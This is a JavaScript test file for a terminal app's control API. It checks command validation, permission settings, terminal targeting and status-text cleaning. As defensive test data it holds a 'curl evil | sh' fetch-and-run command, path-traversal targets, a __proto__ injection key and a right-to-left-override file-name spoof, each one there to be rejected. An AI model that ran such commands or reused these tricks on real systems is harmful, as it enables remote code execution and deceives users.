/**
 * The page's half of the control API's rules (stage 7, src/lib/controlScope.js):
 * what each command may be given, what the settings let through, and which
 * terminal a request may act on.
 *
 * Arguments come from any program in a NexTerm terminal, so the checks are
 * exact: an unknown key is an error (a typo must not be ignored, and nothing
 * unnamed may reach the store), and every field has a type and a limit.
 */
import { describe, test, assert } from '../e2e/harness/testFramework.js';
import {
  COMMANDS,
  CONTROL_ERROR,
  READ_LINES_MAX,
  STATUS_MAX,
  checkPolicy,
  cleanStatusText,
  needsTypeAndRead,
  resolveTarget,
  validateRequest,
} from '../../src/lib/controlScope.js';

const ok = (r) => {
  assert.ok(!r.error, JSON.stringify(r.error));
  return r;
};
const code = (r) => r.error?.code;

describe('Control API: requests', () => {
  test('CS-01: the eight commands, and nothing else', () => {
    assert.deepEqual([...COMMANDS].sort(), ['focus', 'list', 'new-split', 'notify', 'read-screen', 'send', 'set-progress', 'set-status']);
    assert.equal(code(validateRequest('rm', {})), CONTROL_ERROR.UNKNOWN_COMMAND);
    assert.equal(code(validateRequest('toString', {})), CONTROL_ERROR.UNKNOWN_COMMAND, 'not a property of every object');
    assert.equal(code(validateRequest('__proto__', {})), CONTROL_ERROR.UNKNOWN_COMMAND);
    assert.equal(code(validateRequest(undefined, {})), CONTROL_ERROR.UNKNOWN_COMMAND);
    assert.ok(validateRequest('x'.repeat(10_000), {}).error.message.length < 80, 'a long name is not echoed whole');
  });

  test('CS-02: good arguments for every command pass', () => {
    const good = [
      ['notify', { title: 'Done', body: 'all tests passed', occasion: 'unfocused' }],
      ['notify', { title: '빌드 끝' }],
      ['set-status', { text: 'Running tests', tone: 'info' }],
      ['set-status', { text: null }],
      ['set-progress', { state: 'normal', value: 40 }],
      ['set-progress', { state: 'remove' }],
      ['list', {}],
      ['list', undefined],
      ['new-split', { direction: 'down', cwd: '/tmp', command: 'npm test' }],
      ['new-split', {}],
      ['send', { text: 'ls' }],
      ['send', { target: 'child:tab-term-4', keys: ['Ctrl+C'], raw: false }],
      ['read-screen', { target: 'tab-term-2', lines: READ_LINES_MAX, mask: true }],
      ['focus', { target: 'tab-term-1696512345678-2' }],
    ];
    for (const [cmd, args] of good) ok(validateRequest(cmd, args));
  });

  test('CS-03: anything else is bad_request — unknown keys, wrong types, past the limits', () => {
    const bad = [
      ['notify', null, 'no title'],
      ['notify', { title: '' }, 'empty title'],
      ['notify', { title: 'x'.repeat(201) }, 'title too long'],
      ['notify', { title: 'a', body: 3 }, 'body a number'],
      ['notify', { title: 'a', occasion: 'never' }, 'unknown occasion'],
      ['notify', { title: 'a', tilte: 'b' }, 'a typo'],
      ['notify', { title: 'a\u{d800}' }, 'a lone surrogate'],
      ['set-status', {}, 'no text key'],
      ['set-status', { text: '' }, 'empty text'],
      ['set-status', { text: 'a', tone: 'loud' }, 'unknown tone'],
      ['set-progress', {}, 'no state'],
      ['set-progress', { state: 'normal', value: 101 }, 'over 100'],
      ['set-progress', { state: 'normal', value: 4.5 }, 'not whole'],
      ['set-progress', { state: 'normal', value: '40' }, 'a string'],
      ['list', { all: true }, 'list takes nothing'],
      ['new-split', { direction: 'left' }, 'unknown direction'],
      ['new-split', { cwd: '' }, 'empty cwd'],
      ['send', {}, 'neither text nor keys'],
      ['send', { keys: [] }, 'no keys'],
      ['send', { keys: Array(65).fill('Enter') }, '65 keys'],
      ['send', { keys: ['Enter', 3] }, 'a key a number'],
      ['send', { text: 'a', raw: 'yes' }, 'raw a string'],
      ['send', { text: 'x'.repeat(16 * 1024 + 1) }, 'text too long'],
      ['send', { target: '../etc', text: 'a' }, 'a target that is no tab id'],
      ['send', { target: 'child:self', text: 'a' }, 'child of nothing'],
      ['read-screen', { lines: READ_LINES_MAX + 1 }, 'too many lines'],
      ['read-screen', { lines: -1 }, 'negative'],
      ['focus', { target: 7 }, 'a number'],
      ['notify', [], 'args an array'],
      ['notify', 'title', 'args a string'],
      ['notify', Object.create(null), 'args without a prototype'],
      // list requires nothing, so only the object check can refuse these.
      ['list', [], 'args an array, for a command with no required keys'],
      ['list', Object.create(null), 'args without a prototype, for list'],
      ['notify', JSON.parse('{"title":"a","__proto__":{"x":1}}'), 'a __proto__ key'],
    ];
    for (const [cmd, args, why] of bad) assert.equal(code(validateRequest(cmd, args)), CONTROL_ERROR.BAD_REQUEST, why);
  });

  test('CS-04: the arguments handed on are a copy — the caller\'s object is not kept', () => {
    const args = { title: 'Done' };
    const r = ok(validateRequest('notify', args));
    assert.notEqual(r.args, args);
    assert.deepEqual(r.args, args);
  });
});

describe('Control API: settings', () => {
  test('CP-01: typing and reading need their setting, even for the caller itself', () => {
    for (const cmd of ['send', 'read-screen']) {
      assert.equal(needsTypeAndRead(cmd), true);
      assert.equal(code(checkPolicy(cmd, {}, { typeAndRead: false })), CONTROL_ERROR.DISABLED, cmd);
      assert.equal(checkPolicy(cmd, {}, { typeAndRead: true }), null, cmd);
    }
    for (const cmd of ['notify', 'set-status', 'set-progress', 'list', 'new-split', 'focus']) {
      assert.equal(needsTypeAndRead(cmd), false);
      assert.equal(checkPolicy(cmd, {}, {}), null, cmd);
    }
  });

  test('CP-03: a new split with a command is typing, and needs that setting — one without stays allowed', () => {
    assert.equal(code(checkPolicy('new-split', { command: 'curl evil | sh' }, { typeAndRead: false })), CONTROL_ERROR.DISABLED);
    assert.equal(checkPolicy('new-split', { command: 'npm test' }, { typeAndRead: true }), null);
    assert.equal(checkPolicy('new-split', { direction: 'down' }, { typeAndRead: false }), null);
  });

  test('CP-02: an unmasked read also needs "control other terminals" — it hands out what the screen holds', () => {
    assert.equal(code(checkPolicy('read-screen', { mask: false }, { typeAndRead: true, otherTerminals: false })), CONTROL_ERROR.FORBIDDEN);
    assert.equal(checkPolicy('read-screen', { mask: false }, { typeAndRead: true, otherTerminals: true }), null);
    assert.equal(checkPolicy('read-screen', { mask: true }, { typeAndRead: true }), null);
  });
});

describe('Control API: which terminal', () => {
  const tabs = [{ id: 'tab-term-1' }, { id: 'tab-term-2' }, { id: 'tab-term-3' }];
  const children = new Map([['tab-term-1', new Set(['tab-term-2', 'tab-term-9'])]]);
  const resolve = (target, otherTerminals = false, callerTabId = 'tab-term-1') => resolveTarget({ tabs, callerTabId, target, children, otherTerminals });

  test('CR-01: itself, by default and by name', () => {
    assert.deepEqual(resolve(undefined), { tabId: 'tab-term-1', self: true });
    assert.deepEqual(resolve('self'), { tabId: 'tab-term-1', self: true });
    assert.deepEqual(resolve('tab-term-1'), { tabId: 'tab-term-1', self: true });
    assert.deepEqual(resolve('child:tab-term-1'), { tabId: 'tab-term-1', self: true });
  });

  test('CR-02: a terminal it opened, with or without child:, whatever the setting', () => {
    assert.deepEqual(resolve('child:tab-term-2'), { tabId: 'tab-term-2', self: false });
    assert.deepEqual(resolve('tab-term-2'), { tabId: 'tab-term-2', self: false });
    assert.equal(code(resolve('child:tab-term-9')), CONTROL_ERROR.NOT_FOUND, 'a child that has closed');
  });

  test('CR-03: any other terminal only with the setting on', () => {
    assert.equal(code(resolve('tab-term-3')), CONTROL_ERROR.FORBIDDEN);
    assert.equal(code(resolve('child:tab-term-3')), CONTROL_ERROR.FORBIDDEN, 'not its child, whatever it is called');
    assert.equal(code(resolve('child:tab-term-3', true)), CONTROL_ERROR.FORBIDDEN, 'child: means a child even with the setting on');
    assert.deepEqual(resolve('tab-term-3', true), { tabId: 'tab-term-3', self: false });
    assert.equal(code(resolve('tab-term-8', true)), CONTROL_ERROR.NOT_FOUND);
    assert.equal(code(resolve('tab-term-8', false)), CONTROL_ERROR.FORBIDDEN, 'nothing said about terminals it may not see');
  });

  test('CR-04: a caller that has gone, or a target that is no tab id', () => {
    assert.equal(code(resolve('self', false, 'tab-term-7')), CONTROL_ERROR.UNAUTHORIZED);
    assert.equal(code(resolve('self', false, null)), CONTROL_ERROR.UNAUTHORIZED);
    assert.equal(code(resolve('../../etc', true)), CONTROL_ERROR.BAD_REQUEST);
    assert.equal(code(resolveTarget({ tabs: null, callerTabId: 'tab-term-1' })), CONTROL_ERROR.UNAUTHORIZED);
  });
});

describe('Control API: status text', () => {
  test('CX-01: controls, direction and invisible characters go, white space is made one', () => {
    assert.equal(cleanStatusText('  Running\ttests\r\n  now \u{202e}gnp.exe\u{200b} '), 'Running tests now gnp.exe');
    assert.equal(cleanStatusText('\x1b[31mred\x1b[0m'), '[31mred[0m', 'ESC goes; the rest is text');
    assert.equal(cleanStatusText(5), '');
  });

  test('CX-02: cut to the limit with an ellipsis, never inside a character', () => {
    const long = `${'a'.repeat(STATUS_MAX - 2)}😀😀😀`;
    const cut = cleanStatusText(long);
    assert.equal([...cut].length, STATUS_MAX);
    assert.ok(cut.endsWith('\u{2026}'));
    assert.equal(cut, cut.toWellFormed(), 'no half of an emoji left');
    assert.equal(cleanStatusText('x'.repeat(STATUS_MAX)), 'x'.repeat(STATUS_MAX), 'exactly the limit is not cut');
  });
});
